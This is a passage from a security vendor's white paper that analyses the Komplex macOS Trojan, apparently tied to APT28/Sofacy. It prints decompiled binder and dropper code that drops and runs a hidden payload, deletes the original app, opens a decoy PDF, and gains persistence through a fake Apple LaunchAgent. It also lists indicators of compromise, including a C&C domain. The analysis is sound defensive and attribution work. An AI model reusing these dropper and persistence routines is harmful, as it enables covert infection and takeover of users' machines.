@@ -1,0 +1,72 @@
+B. Attack Flow
+Last year on 26 of September, PaloAlto identified a new Mac OS X Trojan associated with the APT28/Sofacy group that received the
+‘Komplex’ name. The Komplex Trojan is a binder with multiple parts: a dropper, a payload and a decoy pdf file.
+
+The Komplex Binder : Is the main executable of “roskosmos_2015-2025.app”. Its main purpose is to save a second payload(the dropper)
+on the system and open the decoy pdf file pictured below.
+
+v7 = objc_msgSend(&OBJC_CLASS___NSString, “stringWithFormat:”, CFSTR(“%@/roskosmos_2015-2025.pdf”),
+v6);
+v8 = objc_msgSend(&OBJC_CLASS___NSString, “stringWithFormat:”, CFSTR(“SetFile -a E %@/
+roskosmos_2015-2025.pdf”), v6);
+v9 = objc_msgSend(&OBJC_CLASS___NSString, “stringWithFormat:”, CFSTR(“rm -rf %@/roskosmos_2015-2025.
+app”), v6);
+v10 = objc_msgSend(
+&OBJC_CLASS___NSString,
+“stringWithFormat:”,
+CFSTR(“open -a Preview.app %@/roskosmos_2015-2025.pdf”),
+v6);
+v11 = objc_msgSend(&OBJC_CLASS___NSData, “dataWithBytes:length:”, &joiner, 135028LL);
+objc_msgSend(v11, “writeToFile:atomically:”, CFSTR(“/tmp/content”), 1LL);
+v12 = (const char *)objc_msgSend(v9, “UTF8String”);
+system(v12);
+system(“chmod 755 /tmp/content”);
+v13 = objc_msgSend(&OBJC_CLASS___NSData, “dataWithBytes:length:”, &pdf, 1584258LL);
+objc_msgSend(v13, “writeToFile:atomically:”, v7, 1LL);
+v14 = (const char *)objc_msgSend(v8, “UTF8String”);
+system(v14);
+v15 = objc_msgSend(&OBJC_CLASS___NSTask, “alloc”);
+v16 = objc_msgSend(v15, “init”);
+objc_msgSend(v16, “setLaunchPath:”, CFSTR(“/tmp/content”));
+objc_msgSend(v16, “launch”);
+objc_msgSend(v16, “waitUntilExit”);
+v17 = (const char *)objc_msgSend(v10, “UTF8String”);
+system(v17);
+The Komplex Binder
+[4]
+White Paper
+Komplex: roskosmos_2015-2025.pdf
+
+
+The Komplex Dropper : Its main functionality is to drop a third Komplex component: the final payload, and ensure persistence on the
+infected system
+system(“mkdir -p /Users/Shared/.local/ &> /dev/null”);
+system(“mkdir -p ~/Library/LaunchAgents/ &> /dev/null”);
+off_10001B4F0(v5, &off_10001B4F0, CFSTR(“/Users/Shared/.local/kextd”), 1LL);
+off_10001B4F0(v6, &off_10001B4F0, CFSTR(“/Users/Shared/com.apple.updates.plist”), 1LL);
+off_10001B4F0(v7, &off_10001B4F0, CFSTR(“/Users/Shared/start.sh”), 1LL);
+system(“cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/ &>/dev/null”);
+remove(“/Users/Shared/com.apple.updates.plist”);
+system(“chmod 755 /Users/Shared/.local/kextd”);
+system(“chmod 755 /Users/Shared/start.sh”);
+
+
+The Komplex Payload : Is the final component of the Komplex malware, with the sole purpose of downloading and executing a file, as
+requested by the C&C servers.
+
+
+In other words, Komplex is an APT28/Sofacy component that can be distributed via email, disguised as a PDF document, to establish
+a foothold in a system. Once it infects the host, it can download and run the next APT28/Sofacy component, which - to the best of our
+knowledge - is the XAgent malware that forms the object of this paper.
+Our assumption is guided by hard evidence included in the binary. Our forensics endeavor revealed a number of indicators that made us
+think XAgent was distributed via Komplex malware:
+[5]
+White Paper
+[6]
+|Col1|Komplex|XAgent|
+|---|---|---|
+|Project path|/Users/kazak/Desktop/Project/komplex|/Users/kazak/Desktop/Project/XAgentOSX|
+|Malwarepathon the infectedsystem|/Users/Shared/.local/kextd|/Username/Library/Assistants/.local/random_name|
+|C&C|apple-iclods[.]net|apple-iclods.org|
+Possible Attack Flow
+White Paper
